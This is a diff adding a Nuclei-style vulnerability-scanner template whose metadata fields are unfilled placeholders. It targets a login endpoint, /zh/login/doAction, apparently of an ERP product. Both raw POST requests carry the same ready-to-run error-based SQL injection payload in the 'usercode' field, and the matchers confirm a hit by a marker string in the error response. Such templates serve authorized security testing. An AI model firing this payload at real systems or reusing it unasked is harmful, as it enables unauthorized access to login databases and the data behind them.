@@ -1,0 +1,47 @@
+id: template-id
+info:
+  name: Template Name
+  author: an'an
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /zh/login/doAction HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Priority: u=0
+        Content-Length: 338
+
+        {"usercode":"1'+(SELECT CHAR(83)+CHAR(87)+CHAR(119)+CHAR(105) WHERE 6635=6635 AND 2366 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2366=2366) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113))))+'","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
+      - |-
+        POST /zh/login/doAction HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Priority: u=0
+        Content-Length: 338
+
+        {"usercode":"1'+(SELECT CHAR(83)+CHAR(87)+CHAR(119)+CHAR(105) WHERE 6635=6635 AND 2366 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2366=2366) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113))))+'","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
+    matchers-condition: and
+    matchers:
+      - type: binary
+        part: body
+        binary:
+          - 20e580bc20277162627a71
+      - type: word
+        part: header
+        words:
+          - '500'
